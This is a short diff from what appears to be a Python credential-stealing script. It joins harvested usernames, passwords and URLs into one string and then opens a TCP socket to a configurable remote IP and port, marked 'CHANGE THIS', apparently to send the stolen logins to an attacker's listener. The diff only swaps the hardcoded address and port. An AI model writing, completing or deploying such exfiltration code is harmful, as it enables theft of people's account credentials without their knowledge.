@@ -128,8 +128,8 @@ to_be_sent = "\n".join([f"{user}: {password} :{url} " for user, password, url in
 
 
 
-ip_addr = "172.29.138.13"
-port = 9001
+ip_addr = "192.168.0.23" # CHANGE THIS
+port = 1234 # CHANGE THIS
 
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     s.connect((ip_addr, port))
